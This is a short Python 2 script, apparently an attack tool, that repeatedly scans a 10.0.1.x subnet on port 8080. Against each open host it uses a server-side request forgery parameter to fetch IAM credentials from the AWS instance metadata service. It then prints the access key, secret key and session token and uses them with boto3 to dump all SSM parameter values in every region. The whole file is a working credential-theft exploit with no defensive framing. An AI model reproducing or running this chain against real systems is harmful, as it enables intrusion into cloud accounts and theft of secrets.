import requests
import traceback
import logging
import socket
import subprocess
import sys
from datetime import datetime
import time
from threading import Thread
import boto3
import json

def check_port(sTargetIp, iTargetPort):
	try:
		import socket
		socket.setdefaulttimeout(1)
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(1)
		result = sock.connect_ex((sTargetIp,iTargetPort))
		if result == 0:
			print "Port is open: " + sTargetIp + ":" + str(iTargetPort)
			rOne = requests.get("http://" + sTargetIp + ":" + str(iTargetPort) + "/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
			rOneText = rOne.text
			rOneText = rOneText.strip()
			print str(rOneText)
			rTwo = requests.get("http://" + sTargetIp + ":" + str(iTargetPort) + "/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/" + rOneText + "/")
			rTwoText = rTwo.text
			rTwoText = rTwoText.strip()
			print str(rTwoText)
			d = json.loads(rTwoText)
			print d['AccessKeyId']
			print d['SecretAccessKey']
			print d['Token']
			# ###
			session = boto3.Session(aws_access_key_id=d['AccessKeyId'], aws_secret_access_key=d['SecretAccessKey'], aws_session_token=d['Token'],region_name='us-east-2')
			ec2 = session.client("ec2",)
			regions = ec2.describe_regions()
			regions = [r['RegionName'] for r in regions['Regions']]
			for r in regions:
				print r
				ssmClient = session.client("ssm", r)
				params = ssmClient.describe_parameters()
				for p in params['Parameters']:
					p_name = p['Name']
					response = ssmClient.get_parameter(
						Name=p_name)
					val = response['Parameter']['Value']
					print "%s - %s" % (p_name, val)
			# ###
		sock.close()
	except Exception as e:
		print str(e)
		logging.error(traceback.format_exc())

iSleepTime = 60 * 3 # 3 minutues
while True:
	print "WhyPhy Time..."
	for i in range(255,0,-1):
		sTargetIp = '10.0.1.' + str(i)
		#print sTargetIp
		iTargetPort = 8080
		t = Thread(target=check_port, args=(sTargetIp,iTargetPort))
		t.start()
	print "Sleepy Time: " + str(iSleepTime)
	time.sleep(iSleepTime)
